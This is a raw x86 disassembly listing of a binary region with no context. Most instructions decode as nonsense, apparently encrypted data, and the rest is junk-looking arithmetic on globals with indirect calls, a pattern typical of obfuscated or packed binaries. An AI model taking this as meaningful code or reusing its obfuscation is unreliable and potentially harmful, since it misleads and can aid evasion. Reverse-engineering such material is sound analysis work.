  41c0be:	leave  
  41c0bf:	stc    
  41c0c0:	pushf  
  41c0c1:	in     eax,0x3a
  41c0c3:	(bad)  
  41c0c4:	jmp    0x41c04b
  41c0c6:	and    edx,ebp
  41c0c8:	vunpckhps ymm1,ymm4,YMMWORD PTR [ebx+eax*2+0x3446f0ea]
  41c0d1:	pop    ebx
  41c0d2:	into   
  41c0d3:	jnp    0x41c0ab
  41c0d5:	xchg   BYTE PTR [ecx-0x3ade0a33],bl
  41c0db:	mov    BYTE PTR [ebx],bh
  41c0dd:	js     0x41c0ba
  41c0df:	popa   
  41c0e0:	and    ecx,DWORD PTR [esi-0x157fe3ba]
  41c0e6:	int    0xd0
  41c0e8:	int    0x3c
  41c0ea:	inc    ebx
  41c0eb:	jnp    0x41c07b
  41c0ed:	xor    BYTE PTR [ecx-0x7c],bh
  41c0f0:	(bad)  [ebx]
  41c0f2:	iret   
  41c0f3:	in     al,0x85
  41c0f5:	inc    eax
  41c0f6:	mov    ds:0x70368687,eax
  41c0fb:	popa   
  41c0fc:	inc    BYTE PTR [edi]
  41c0fe:	sub    eax,0x84bd4d85
  41c103:	xchg   esi,eax
  41c104:	daa    
  41c105:	addr16 xor edx,eax
  41c108:	stos   BYTE PTR es:[edi],al
  41c109:	aaa    
  41c10a:	bound  edi,QWORD PTR [ebp+0x179d065]
  41c110:	add    eax,0x70bc47f4
  41c115:	or     ah,0x93
  41c118:	das    
  41c119:	shr    DWORD PTR [esi+ebx*4-0x12],1
  41c11d:	xchg   esp,eax
  41c11e:	mov    ebp,0xa1bf91ad
  41c123:	out    dx,eax
  41c124:	push   0x55e985b4
  41c129:	add    DWORD PTR [ebx],ebp
  41c12b:	sub    al,0xcf
  41c12d:	cmp    ch,bh
  41c12f:	fs mov edi,?
  41c132:	jp     0x41c163
  41c134:	sbb    al,0x9e
  41c136:	jmp    0x41c0d0
  41c138:	mov    dl,0x54
  41c13a:	imul   esi,eax,0x554b7cfd
  41c140:	cmp    dh,BYTE PTR [ecx+eax*2-0x14ade402]
  41c147:	pushf  
  41c148:	das    
  41c149:	inc    eax
  41c14a:	inc    edi
  41c14b:	ficom  DWORD PTR [eax-0x5130bc4f]
  41c151:	(bad)  
  41c152:	or     DWORD PTR [edx+edx*4-0x7e],0x61
  41c157:	pushf  
  41c158:	lock cdq 
  41c15a:	stos   DWORD PTR es:[edi],eax
  41c15b:	mov    cl,0x28
  41c15d:	mov    ecx,0xd73d3406
  41c162:	fisubr WORD PTR [ebp-0x1d60d62e]
  41c168:	lods   al,BYTE PTR ds:[esi]
  41c169:	std    
  41c16a:	sbb    ebp,DWORD PTR [esi+0x11454092]
  41c170:	xor    al,BYTE PTR [edi]
  41c172:	fs fs dec ebx
  41c175:	inc    ebx
  41c176:	fstp   QWORD PTR [edx-0x68b85aec]
  41c17c:	fnstcw WORD PTR [edi+eax*8]
  41c17f:	add    edi,esi
  41c181:	scas   eax,DWORD PTR es:[edi]
  41c182:	sub    DWORD PTR [ebx+0x40],ebx
  41c185:	jne    0x41c11c
  41c187:	sub    DWORD PTR [edx-0x1f15a985],ebp
  41c18d:	in     al,0x4f
  41c18f:	xor    eax,0xf14cb188
  41c194:	cmp    BYTE PTR [ebx+0x41],dl
  41c197:	cdq    
  41c198:	out    dx,al
  41c199:	inc    esi
  41c19a:	jns    0x41c1d9
  41c19c:	jge    0x41c1d9
  41c19e:	std    
  41c19f:	xor    ah,BYTE PTR ds:0x21374b18
  41c1a5:	lock ror DWORD PTR ds:0xca52468b,cl
  41c1ac:	mov    BYTE PTR [ebp+ebx*4-0x26],ah
  41c1b0:	sahf   
  41c1b1:	test   al,0xd2
  41c1b3:	inc    esp
  41c1b4:	in     eax,dx
  41c1b5:	(bad)  
  41c1b6:	mov    eax,ds:0x3537ef
  41c1bb:	lods   eax,DWORD PTR ds:[esi]
  41c1bc:	cmp    BYTE PTR [edx+0xf86b8e6],al
  41c1c2:	cmc    
  41c1c3:	sbb    eax,0xeae2eef0
  41c1c8:	ret    
  41c1c9:	mov    bh,0x66
  41c1cb:	mov    ds:0x1609dd04,eax
  41c1d0:	dec    esp
  41c1d1:	pusha  
  41c1d2:	outs   dx,DWORD PTR ds:[esi]
  41c1d3:	and    bh,BYTE PTR [ebx-0x246435b6]
  41c1d9:	into   
  41c1da:	(bad)  [ecx-0x5d]
  41c1dd:	leave  
  41c1de:	jmp    0xb97:0x42f96f4a
  41c1e5:	mov    eax,0x235842cf
  41c1ea:	push   edx
  41c1eb:	mov    edi,0x1d890f29
  41c1f0:	sub    eax,0x27388493
  41c1f5:	sub    esp,DWORD PTR [eax+eax*8-0x6139f06a]
  41c1fc:	dec    ebp
  41c1fd:	imul   edx,ebx,0xffffffa7
  41c200:	test   eax,0x1a745c3c
  41c205:	push   0xffffff89
  41c207:	rcl    DWORD PTR [esi+0x4a],cl
  41c20a:	test   al,0x0
  41c20c:	mov    eax,DWORD PTR [ecx+ecx*4]
  41c20f:	pop    esp
  41c210:	mov    DWORD PTR [edx+0x45],0x34e81034
  41c217:	xchg   ebx,eax
  41c218:	in     eax,dx
  41c219:	or     DWORD PTR [esi],edi
  41c21b:	mov    cl,0x17
  41c21d:	mov    bh,0xcc
  41c21f:	enter  0xa19d,0x69
  41c223:	or     ch,BYTE PTR [ebx+ecx*8+0x36]
  41c227:	scas   eax,DWORD PTR es:[edi]
  41c228:	xor    eax,0x662d6eb6
  41c22d:	sub    dl,bh
  41c22f:	ds jbe 0x41c1eb
  41c232:	mov    ?,WORD PTR [ebp+0x56]
  41c235:	xor    ch,bl
  41c237:	ffreep st(6)
  41c239:	xchg   esi,eax
  41c23a:	sub    edi,DWORD PTR [ecx+esi*8-0x7a]
  41c23e:	nop
  41c23f:	ss mov ecx,0xbeb1b625
  41c245:	jno    0x41c1c8
  41c247:	pushf  
  41c248:	(bad)  
  41c249:	(bad)  
  41c24a:	dec    edi
  41c24b:	outs   dx,DWORD PTR ds:[esi]
  41c24c:	aad    0x49
  41c24e:	mov    dl,0xbd
  41c250:	mov    bl,0xc5
  41c252:	pop    esi
  41c253:	pop    esp
  41c254:	pop    eax
  41c255:	mov    al,ds:0x619d0782
  41c25a:	nop
  41c25b:	aaa    
  41c25c:	xchg   BYTE PTR [ebp-0x779f8e8c],dh
  41c262:	cwde   
  41c263:	pop    ecx
  41c264:	pushf  
  41c265:	add    al,0xc7
  41c267:	mov    ebx,0x5d1d25f5
  41c26c:	stos   DWORD PTR es:[edi],eax
  41c26d:	(bad)  
  41c26e:	mov    ah,0x45
  41c270:	idiv   edx
  41c272:	jmp    0x1d9a4343
  41c277:	mov    WORD PTR [ecx-0x1c],cs
  41c27a:	cdq    
  41c27b:	(bad)  
  41c27d:	in     al,0x41
  41c27f:	scas   eax,DWORD PTR es:[edi]
  41c280:	js     0x41c268
  41c282:	push   0xd2d22431
  41c287:	mov    ds:0x903d7635,eax
  41c28c:	lods   al,BYTE PTR ds:[esi]
  41c28d:	and    esp,edx
  41c28f:	add    al,0xbd
  41c291:	add    bl,BYTE PTR [edi]
  41c293:	out    dx,eax
  41c294:	adc    eax,DWORD PTR [edi-0xf]
  41c297:	pop    eax
  41c298:	jmp    0x8d26:0xf509a5c1
  41c29f:	push   ebp
  41c2a0:	xchg   edi,eax
  41c2a1:	lods   eax,DWORD PTR ds:[esi]
  41c2a2:	mov    WORD PTR [ecx],?
  41c2a4:	mov    ebp,0x3bd1db1a
  41c2a9:	sbb    cl,BYTE PTR [esi+0x5e1df429]
  41c2af:	out    dx,al
  41c2b0:	(bad)  
  41c2b1:	retfw  
  41c2b3:	pop    eax
  41c2b4:	test   BYTE PTR [edi],al
  41c2b6:	fdiv   QWORD PTR [esi+0x4787e0f9]
  41c2bc:	mov    ecx,0x627ae24
  41c2c1:	adc    esi,ecx
  41c2c3:	ins    BYTE PTR es:[edi],dx
  41c2c4:	out    0xd0,al
  41c2c6:	shl    DWORD PTR [ecx-0x5e],cl
  41c2c9:	add    ah,BYTE PTR [edi+0x11]
  41c2cc:	aad    0x11
  41c2ce:	retf   0x4829
  41c2d1:	retf   
  41c2d2:	cld    
  41c2d3:	pusha  
  41c2d4:	xchg   ecx,eax
  41c2d5:	fs mov ebp,0x20a3d3aa
  41c2db:	js     0x41c34a
  41c2dd:	daa    
  41c2de:	(bad)  
  41c2df:	jecxz  0x41c31c
  41c2e1:	sub    dl,BYTE PTR [edi]
  41c2e3:	mov    al,0xfb
  41c2e5:	std    
  41c2e6:	sub    BYTE PTR [ebp+edi*2+0x61262e26],dh
  41c2ed:	mov    BYTE PTR [ebp-0x23],ch
  41c2f0:	out    dx,al
  41c2f1:	imul   BYTE PTR [ebx-0x48da5c74]
  41c2f7:	aaa    
  41c2f8:	shr    bh,1
  41c2fa:	cmp    eax,0x24eb5594
  41c2ff:	outs   dx,BYTE PTR ds:[esi]
  41c300:	inc    ebp
  41c301:	ss (bad) 
  41c304:	mov    ah,0x6
  41c306:	in     al,0x29
  41c308:	std    
  41c309:	sbb    dl,al
  41c30b:	pop    edi
  41c30c:	sbb    BYTE PTR [edi],0x91
  41c30f:	push   esp
  41c310:	mov    ecx,0xefde42cc
  41c315:	mov    esp,0x62b10e6
  41c31a:	fbstp  TBYTE PTR ds:0x5e8c
  41c320:	mov    DWORD PTR [ebp-0x48],eax
  41c323:	sbb    DWORD PTR ds:0x4284e5,edi
  41c329:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41c333:	mov    DWORD PTR [ebp-0x138],0x1169
  41c33d:	mov    DWORD PTR [ebp-0x12c],0x1379
  41c347:	sbb    DWORD PTR ds:0x428555,ecx
  41c34d:	mov    eax,DWORD PTR [ebp-0x12c]
  41c353:	adc    DWORD PTR ds:0x4284c9,0x44e5
  41c35d:	mov    ecx,0x5856
  41c362:	sub    ecx,eax
  41c364:	and    DWORD PTR ds:0x428425,ecx
  41c36a:	shr    ecx,0x2
  41c36d:	cmp    DWORD PTR ds:0x42856d,0x0
  41c374:	mov    DWORD PTR ds:0x428419,0x1c8e
  41c37e:	mov    DWORD PTR ds:0x4284f9,0x3a72
  41c388:	mov    DWORD PTR ds:0x42833d,0x2994
  41c392:	jmp    0x41c475
  41c397:	mov    eax,ds:0x4284dd
  41c39c:	cmp    DWORD PTR ds:0x42856d,0x0
  41c3a3:	jge    0x41c3d2
  41c3a9:	push   DWORD PTR [ebp-0x20]
  41c3ac:	push   DWORD PTR [ebp-0x24]
  41c3af:	push   DWORD PTR [ebp-0x1c]
  41c3b2:	call   DWORD PTR ds:0x42e120
  41c3b8:	and    DWORD PTR ds:0x428409,edx
  41c3be:	sub    DWORD PTR ds:0x428369,0x53c2
  41c3c8:	and    DWORD PTR ds:0x42836d,0x428579
  41c3d2:	or     DWORD PTR ds:0x428549,edi
  41c3d8:	sbb    DWORD PTR ds:0x428365,0x428555
  41c3e2:	cmp    DWORD PTR ds:0x428471,0x0
  41c3e9:	mov    DWORD PTR ds:0x428441,0x3b49
  41c3f3:	mov    DWORD PTR ds:0x428451,0x7933
  41c3fd:	mov    DWORD PTR ds:0x428465,0x897
  41c407:	mov    DWORD PTR ds:0x428359,0x5a92
  41c411:	jmp    0x41c475
  41c416:	mov    eax,0x55e0
  41c41b:	movzx  eax,WORD PTR ds:0x4284cd
  41c422:	cmp    DWORD PTR ds:0x428471,0x0
  41c429:	ja     0x41c45f
  41c42f:	push   DWORD PTR [ebp-0x18]
  41c432:	push   DWORD PTR [ebp-0x18]
  41c435:	push   DWORD PTR [ebp-0x18]
  41c438:	push   DWORD PTR [ebp-0x20]
  41c43b:	push   0x8c53
  41c440:	push   DWORD PTR [ebp-0x14]
  41c443:	call   DWORD PTR ds:0x42e068
  41c449:	add    DWORD PTR ds:0x428405,ecx
  41c44f:	not    DWORD PTR ds:0x4284d9
  41c455:	adc    DWORD PTR ds:0x428449,0x2c56
  41c45f:	add    DWORD PTR ds:0x4284f5,0x42842d
  41c469:	add    DWORD PTR ds:0x42840d,edi
  41c46f:	sub    DWORD PTR ds:0x42847d,edx
  41c475:	sub    ecx,0x5be6
  41c47b:	mov    eax,DWORD PTR [ebp-0x138]
  41c481:	xor    DWORD PTR ds:0x428435,0x2de
  41c48b:	imul   ecx,eax
  41c48e:	mov    eax,ds:0x428465
  41c493:	add    DWORD PTR ds:0x42857d,eax
  41c499:	mov    eax,DWORD PTR [ebp-0x13c]
  41c49f:	and    ecx,eax
  41c4a1:	cmp    DWORD PTR ds:0x428579,0x0
  41c4a8:	mov    DWORD PTR ds:0x42845d,0x420b
  41c4b2:	mov    DWORD PTR ds:0x4284d9,0x3ab4
  41c4bc:	mov    DWORD PTR ds:0x428479,0x3618
  41c4c6:	jmp    0x41c90c
  41c4cb:	mov    DWORD PTR ds:0x428419,0xf37
  41c4d5:	not    eax
  41c4d7:	cmp    DWORD PTR ds:0x428579,0x0
  41c4de:	jg     0x41c505
  41c4e4:	push   0x2612
  41c4e9:	push   DWORD PTR [ebp-0x1c]
  41c4ec:	push   DWORD PTR [ebp-0x14]
  41c4ef:	call   DWORD PTR ds:0x42e06c
  41c4f5:	and    DWORD PTR ds:0x428459,0x4284e9
  41c4ff:	add    DWORD PTR ds:0x42834d,edi
  41c505:	xor    DWORD PTR ds:0x42841d,edx
  41c50b:	sbb    DWORD PTR ds:0x428465,0x428455
  41c515:	mov    DWORD PTR ds:0x428479,0x491d
  41c51f:	add    DWORD PTR ds:0x428351,ebx
  41c525:	jmp    0x41c90c
  41c52a:	sub    ch,BYTE PTR [esi-0x62]
  41c52d:	sbb    DWORD PTR [edx-0x7c9145e7],edi
  41c533:	pop    ebp
  41c534:	and    al,0x9e
  41c536:	jae    0x41c593
  41c538:	fninit 
  41c53a:	pusha  
  41c53b:	inc    ecx
  41c53c:	sar    BYTE PTR [esi-0x41413bb6],0x3e
  41c543:	add    dh,BYTE PTR [ebx]
  41c545:	xchg   esp,eax
  41c546:	inc    eax
  41c547:	leave  
  41c548:	frstor [esi]
  41c54a:	push   edi
  41c54b:	jne    0x41c51a
  41c54d:	cwde   
  41c54e:	jl     0x41c593
  41c550:	retf   
  41c551:	mov    eax,DWORD PTR [ecx]
  41c553:	sbb    cl,ch
  41c555:	dec    edx
  41c556:	mov    cl,0x16
  41c558:	aad    0x1b
  41c55a:	xchg   esp,eax
  41c55b:	rcr    BYTE PTR [edi+0x37deea4a],cl
  41c561:	cmp    al,0x35
  41c563:	mov    eax,DWORD PTR [ebp+0x29]
  41c566:	cmp    eax,0x2f587e8b
  41c56b:	xor    DWORD PTR [eax-0x67c4b1dc],0xfffffffd
  41c572:	mov    dh,0x7
  41c574:	dec    esi
  41c575:	mov    ebx,0x2ad4cddb
  41c57a:	out    dx,eax
  41c57b:	push   ebx
  41c57c:	call   0x9197a79c
  41c581:	lods   eax,DWORD PTR ds:[esi]
  41c582:	lock or DWORD PTR [edx],ebx
  41c585:	std    
  41c586:	cdq    
  41c587:	fadd   QWORD PTR [ebp-0x1d]
  41c58a:	mov    BYTE PTR [edi],cl
  41c58c:	sub    al,0x80
  41c58e:	adc    edi,edi
  41c590:	lods   eax,DWORD PTR ds:[esi]
  41c591:	sub    al,0xba
  41c593:	or     al,0x47
  41c595:	data16 mov dh,0xae
  41c598:	arpl   WORD PTR [eax-0x5c],bx
  41c59b:	ins    DWORD PTR es:[edi],dx
  41c59c:	dec    esp
  41c59d:	popf   
  41c59e:	jnp    0x41c61d
  41c5a0:	in     eax,dx
  41c5a1:	sub    BYTE PTR [ecx-0x7cab5504],bh
  41c5a7:	or     DWORD PTR [edx+0x48],esp
  41c5aa:	lahf   
  41c5ab:	imul   esi,DWORD PTR [eax],0xffffff8b
  41c5ae:	in     eax,0xa2
  41c5b0:	mov    ds:0x74db8e40,eax
  41c5b5:	fadd   st,st(7)
  41c5b7:	or     bh,cl
  41c5b9:	rol    BYTE PTR [eax],1
  41c5bb:	fdiv   QWORD PTR [edx]
  41c5bd:	and    al,BYTE PTR [ecx+eiz*2+0x29]
  41c5c1:	sti    
  41c5c2:	sub    BYTE PTR [eax-0x7b],bl
  41c5c5:	popf   
  41c5c6:	outs   dx,BYTE PTR ds:[esi]
  41c5c7:	dec    ax
  41c5c9:	dec    eax
  41c5ca:	sub    al,0x6d
  41c5cc:	inc    esp
  41c5cd:	xor    bh,ah
  41c5cf:	and    bl,BYTE PTR [edi+0x30abe175]
  41c5d5:	mov    BYTE PTR [esi-0x49],al
  41c5d8:	and    al,0x88
  41c5da:	in     eax,dx
  41c5db:	fisub  DWORD PTR [esi+0x1eb906f7]
  41c5e1:	sbb    BYTE PTR [eax-0x7d608743],cl
  41c5e7:	fcom   QWORD PTR [ebx]
  41c5e9:	ret    0xb47d
  41c5ec:	jns    0x41c5a9
  41c5ee:	jecxz  0x41c5d1
  41c5f0:	cmp    BYTE PTR [ebp-0x5915dcc7],ch
  41c5f6:	push   ds
  41c5f7:	mov    esi,0x25272b82
  41c5fc:	outs   dx,DWORD PTR ds:[esi]
  41c5fd:	push   ds
  41c5fe:	jne    0x41c5d3
  41c600:	ins    BYTE PTR es:[edi],dx
  41c601:	mov    esi,0x8a238b0d
  41c606:	test   ebx,ebp
  41c608:	mov    dl,0x56
  41c60a:	mov    bh,0xa2
  41c60c:	xchg   esi,eax
  41c60d:	cmp    eax,0x7863c094
  41c612:	mov    al,0x20
  41c614:	push   ss
  41c615:	lods   al,BYTE PTR ds:[esi]
  41c616:	(bad)  
  41c617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c618:	push   ebp
  41c619:	inc    ebp
  41c61a:	fldcw  WORD PTR [edi-0x3f9b0efc]
  41c620:	test   DWORD PTR [esi+0x3b],0x67b7174a
  41c627:	arpl   WORD PTR [esi],sp
  41c629:	jl     0x41c625
  41c62b:	xor    eax,0xac2c7b59
  41c630:	lock mov bh,0xf8
  41c633:	ins    DWORD PTR es:[edi],dx
  41c634:	add    ah,0x22
  41c637:	repnz out 0x7c,al
  41c63a:	xchg   ebx,eax
  41c63b:	push   0x4a
  41c63d:	jmp    0x63ba0658
  41c642:	pop    edx
  41c643:	push   ecx
  41c644:	jmp    0x325c2beb
  41c649:	inc    ebx
  41c64a:	imul   ebx,esi,0xffffffc9
  41c64d:	out    dx,eax
  41c64e:	int    0x68
  41c650:	or     ecx,DWORD PTR [edx]
  41c652:	mov    bl,0xb1
  41c654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c655:	push   ebp
  41c656:	push   0xffffffa0
  41c658:	xlat   BYTE PTR ds:[ebx]
  41c659:	pop    esp
  41c65a:	mov    dl,0x49
  41c65c:	fmul   DWORD PTR [ecx-0x41]
  41c65f:	add    ebp,ebp
  41c661:	xor    DWORD PTR [esi-0x75614449],ecx
  41c667:	jae    0x41c6b1
  41c669:	mov    ah,0x5
  41c66b:	les    ecx,FWORD PTR [edx+0x25]
  41c66e:	addr16 pop ebp
  41c670:	clc    
  41c671:	into   
  41c672:	xchg   ebp,eax
  41c673:	push   cs
  41c674:	ror    DWORD PTR [ebp-0x59a736f9],cl
  41c67a:	dec    edx
  41c67b:	cmp    ah,BYTE PTR [edi]
  41c67d:	inc    esi
  41c67e:	inc    esi
  41c67f:	mov    ebx,0xfeff0735
  41c684:	sub    cl,BYTE PTR [ecx]
  41c686:	loope  0x41c6de
  41c688:	pop    esi
  41c689:	dec    edx
  41c68a:	add    dl,BYTE PTR [eax+0x1de2869e]
  41c690:	outs   dx,DWORD PTR ds:[esi]
  41c691:	jge    0x41c686
  41c693:	(bad)  
  41c694:	popf   
  41c695:	push   esp
  41c696:	adc    DWORD PTR [ebx],esi
  41c698:	xor    eax,0xd12d2211
  41c69d:	ret    0x92ce
  41c6a0:	adc    ch,BYTE PTR [esi+ebx*2+0x26]
  41c6a4:	add    BYTE PTR [ebp-0x14],bh
  41c6a7:	push   ebp
  41c6a8:	sbb    edi,DWORD PTR [eax]
  41c6aa:	mov    WORD PTR [edx+0x3f],gs
  41c6ad:	jbe    0x41c703
  41c6af:	pop    edi
  41c6b0:	sbb    al,0xac
  41c6b2:	nop
  41c6b3:	ror    DWORD PTR [edx+0x1fb980a9],cl
  41c6b9:	inc    BYTE PTR [ecx+0x7ae060bf]
  41c6bf:	cs dec edx
  41c6c1:	bnd jg 0x41c72c
  41c6c4:	and    DWORD PTR [ebp+0x3a],edx
  41c6c7:	fstp   QWORD PTR [ecx]
  41c6c9:	pop    edx
  41c6ca:	push   ebp
  41c6cb:	mov    ecx,0x794a5f1e
  41c6d0:	mov    esi,DWORD PTR [ebx-0x68]
  41c6d3:	adc    al,BYTE PTR [ebx-0xe401b00]
  41c6d9:	imul   ebp,DWORD PTR [esi+0x240182c9],0xffffffc3
  41c6e0:	mov    ecx,0x67553337
  41c6e5:	lahf   
  41c6e6:	mov    al,ds:0x82ba0472
  41c6eb:	push   ebp
  41c6ec:	mov    WORD PTR [edi+0x6f606736],?
  41c6f2:	dec    ebx
  41c6f3:	and    al,0x85
  41c6f5:	push   ebp
  41c6f6:	adc    al,0x35
  41c6f8:	retf   
  41c6f9:	icebp  
  41c6fa:	cmp    cl,BYTE PTR cs:[edi+0x75a0e1d3]
  41c701:	fistp  WORD PTR [esi+eax*8-0x36197146]
  41c708:	sub    dh,BYTE PTR [eax]
  41c70a:	sbb    ch,BYTE PTR [ebx-0x29]
  41c70d:	push   edx
  41c70e:	ins    BYTE PTR es:[edi],dx
  41c70f:	and    al,0x75
  41c711:	fidivr WORD PTR [ebp+0x640e05e1]
  41c717:	mov    esp,0x19dcefeb
  41c71c:	out    0x55,eax
  41c71e:	push   es
  41c71f:	retf   0x56c9
  41c722:	inc    esp
  41c723:	cli    
  41c724:	xchg   esp,eax
  41c725:	jnp    0x41c711
  41c727:	add    DWORD PTR [ebp-0x661c1f71],edi
  41c72d:	inc    esp
  41c72e:	mov    esi,0x9fbd2314
  41c733:	stc    
  41c734:	add    DWORD PTR [edi+0x58],edx
  41c737:	out    dx,eax
  41c738:	int3   
  41c739:	mov    eax,ds:0x13f53cb
  41c73e:	stc    
  41c73f:	pop    eax
  41c740:	aam    0xea
  41c742:	inc    ebx
  41c743:	test   DWORD PTR [eax+0x7ebb5673],0xc15f71a5
  41c74d:	sbb    eax,0xedf20571
  41c753:	leave  
  41c754:	data16 xor BYTE PTR [ecx-0x730a147d],ah
  41c75b:	cmp    eax,0xcbe38801
  41c760:	enter  0x3a61,0x77
  41c764:	(bad)  
  41c765:	push   ss
  41c766:	lock into 
  41c768:	add    al,BYTE PTR [eax]
  41c76a:	xor    DWORD PTR ds:0x7c10a68f,edi
  41c770:	mov    cs:0x1743b479,eax
  41c776:	adc    ch,BYTE PTR [ebx]
  41c778:	sbb    esp,edi
  41c77a:	pop    esp
  41c77b:	imul   ebx,DWORD PTR [edi-0x3935ffeb],0x7e74b381
  41c785:	jl     0x41c709
  41c787:	pop    ds
  41c788:	or     eax,0xc34f1f1b
  41c78d:	jge    0x41c711
  41c78f:	stc    
  41c790:	test   eax,0x4117ee5f
  41c795:	mov    dh,0xcd
  41c797:	dec    eax
  41c798:	pop    es
  41c799:	xor    al,0x4f
  41c79b:	js     0x41c7b1
  41c79d:	retf   
  41c79e:	mov    cs,WORD PTR [ebx-0x14]
  41c7a1:	mov    DWORD PTR [edx+eax*2+0x6553f777],eax
  41c7a8:	push   ebp
  41c7a9:	pop    ebx
  41c7aa:	dec    esi
  41c7ab:	rcl    BYTE PTR [ebx+0x178eca55],1
  41c7b1:	ja     0x41c7d2
  41c7b3:	arpl   WORD PTR [ebp-0x5d],cx
  41c7b6:	fst    QWORD PTR ds:0x51e51523
  41c7bc:	jmp    0xd7726b3f
  41c7c1:	mov    bl,ch
  41c7c3:	push   0xffffffcf
  41c7c5:	mov    edi,0xffcefeb
  41c7ca:	dec    edi
  41c7cb:	mov    edx,0xa07c1030
  41c7d0:	les    ebp,FWORD PTR [ecx-0x5f]
  41c7d3:	jmp    0xee08e4d5
  41c7d8:	adc    ecx,esi
  41c7da:	xlat   BYTE PTR ds:[ebx]
  41c7db:	fld    TBYTE PTR [eax+0x4b]
  41c7de:	mov    dl,0xda
  41c7e0:	push   ecx
  41c7e1:	ror    bh,0xe5
  41c7e4:	fisubr WORD PTR ds:0xe74756a
  41c7ea:	inc    edx
  41c7eb:	fisttp DWORD PTR [ebx+0x47]
  41c7ee:	inc    eax
  41c7ef:	test   al,0x7c
  41c7f1:	repnz pushf 
  41c7f3:	mov    esi,0xd7aa9f69
  41c7f8:	stos   BYTE PTR es:[edi],al
  41c7f9:	neg    BYTE PTR [ebp+0x6f0d2097]
  41c7ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c800:	lods   al,BYTE PTR ds:[esi]
  41c801:	or     eax,0x10039535
  41c806:	mov    cl,0xb2
  41c808:	call   0xcc7e:0x4dbed2ba
  41c80f:	sahf   
  41c810:	(bad)  [ecx-0x5e]
  41c813:	xlat   BYTE PTR ds:[ebx]
  41c814:	mov    esi,es
  41c816:	push   es
  41c817:	sub    al,0xd1
  41c819:	mov    dl,0xb4
  41c81b:	or     BYTE PTR ds:0xd30d7991,0xee
  41c822:	into   
  41c823:	and    al,0xce
  41c825:	push   es
  41c826:	push   ebp
  41c827:	fnsave [edx]
  41c829:	pminub mm7,QWORD PTR [ecx+0x4d]
  41c82d:	retf   
  41c82e:	or     DWORD PTR [edi-0x4235e2da],ebx
  41c834:	mov    ds:0xf0ab388,eax
  41c839:	or     ah,BYTE PTR [edx+esi*4-0x11]
  41c83d:	cmp    edi,DWORD PTR [edi]
  41c83f:	mov    BYTE PTR [esi+0x5d262b98],dl
  41c845:	mov    bx,0x2975
  41c849:	(bad)  
  41c84a:	jo     0x41c7d5
  41c84c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c84d:	inc    edx
  41c84e:	loopne 0x41c84d
  41c850:	addr16 or edx,edi
  41c853:	(bad)  
  41c854:	in     eax,0xfc
  41c856:	cmp    dl,BYTE PTR [ebx]
  41c858:	mov    ebx,DWORD PTR [ecx]
  41c85a:	dec    ecx
  41c85b:	pop    es
  41c85c:	ins    BYTE PTR es:[edi],dx
  41c85d:	repnz xchg esp,eax
  41c85f:	mov    ecx,0x1ac2bdc0
  41c864:	pop    ecx
  41c865:	xor    ch,BYTE PTR [edi-0x3079ccee]
  41c86b:	mov    eax,ds:0xcaf34250
  41c870:	lods   al,BYTE PTR ds:[esi]
  41c871:	ds scas eax,DWORD PTR es:[edi]
  41c873:	outs   dx,BYTE PTR ds:[esi]
  41c874:	sbb    DWORD PTR [ecx*8+0x19f91d72],0x1ed53a
  41c87f:	or     DWORD PTR [ebp+0x4e172322],0x8dd9dee8
  41c889:	push   esi
  41c88a:	xchg   esi,eax
  41c88b:	or     BYTE PTR [ecx+0x72],bh
  41c88e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41c890:	fist   DWORD PTR [esi+eax*4-0x15d4b323]
  41c897:	or     DWORD PTR [esi],ebx
  41c899:	jle    0x41c862
  41c89b:	out    0x37,al
  41c89d:	fidivr DWORD PTR [ebx+0x29539168]
  41c8a3:	test   BYTE PTR fs:[ecx],0xf0
  41c8a7:	xor    ebp,esp
  41c8a9:	daa    
  41c8aa:	sar    ecx,1
  41c8ac:	loope  0x41c8e1
  41c8ae:	push   ebx
  41c8af:	loope  0x41c832
  41c8b1:	pop    eax
  41c8b2:	call   0xf83998a4
  41c8b7:	push   ss
  41c8b8:	repnz fwait
  41c8ba:	dec    eax
  41c8bb:	das    
  41c8bc:	(bad)  
  41c8bd:	pop    ebp
  41c8be:	push   cs
  41c8bf:	test   BYTE PTR [ecx],al
  41c8c1:	inc    esi
  41c8c2:	push   0xffffffd9
  41c8c4:	mov    edi,0x31ce4594
  41c8c9:	sbb    dl,0x10
  41c8cc:	push   eax
  41c8cd:	fnstcw WORD PTR [ecx]
  41c8cf:	adc    ebx,esi
  41c8d1:	out    dx,al
  41c8d2:	adc    DWORD PTR [eax],ebx
  41c8d4:	ss dec ecx
  41c8d6:	mov    edx,edi
  41c8d8:	cli    
  41c8d9:	sbb    BYTE PTR [esi+0x33],al
  41c8dc:	xchg   edx,eax
  41c8dd:	jb     0x41c87c
  41c8df:	sbb    DWORD PTR [eax+0x618e5b11],ecx
  41c8e5:	call   DWORD PTR [ebx]
  41c8e7:	or     dl,ah
  41c8e9:	lock and eax,0xb7b5ad79
  41c8ef:	addr16 mov ch,0x92
  41c8f2:	adc    DWORD PTR [edi+edi*4-0x2c],ebp
  41c8f6:	sbb    edi,DWORD PTR [edx+0xb415ce1]
  41c8fc:	jae    0x41c966
  41c8fe:	xor    esp,edx
  41c900:	stos   BYTE PTR es:[edi],al
  41c901:	add    BYTE PTR [ecx+edx*2],ch
  41c904:	xchg   ebp,eax
  41c905:	int    0xc5
  41c907:	pushf  
  41c908:	xor    eax,DWORD PTR [ebp+0x1]
  41c90b:	sub    edi,DWORD PTR [eax+0x3b18]
  41c911:	or     DWORD PTR ds:0x42857d,0x428415
  41c91b:	sub    eax,ecx
  41c91d:	mov    ecx,DWORD PTR ds:0x42847d
  41c923:	sbb    ecx,DWORD PTR ds:0x4284d9
  41c929:	mov    DWORD PTR ds:0x42847d,ecx
  41c92f:	mov    DWORD PTR [ebp-0xfc],eax
  41c935:	movzx  eax,BYTE PTR ds:0x428359
  41c93c:	sub    eax,DWORD PTR ds:0x428339
  41c942:	mov    ds:0x428359,eax
  41c947:	mov    DWORD PTR [ebp-0x28],0x16d7
  41c94e:	mov    DWORD PTR [ebp-0x134],0x6b4
  41c958:	mov    eax,DWORD PTR [ebp-0x134]
  41c95e:	cmp    DWORD PTR ds:0x42857d,0x0
  41c965:	mov    ecx,0x4723
  41c96a:	mov    DWORD PTR ds:0x428341,0x48a0
  41c974:	jmp    0x41c9c9
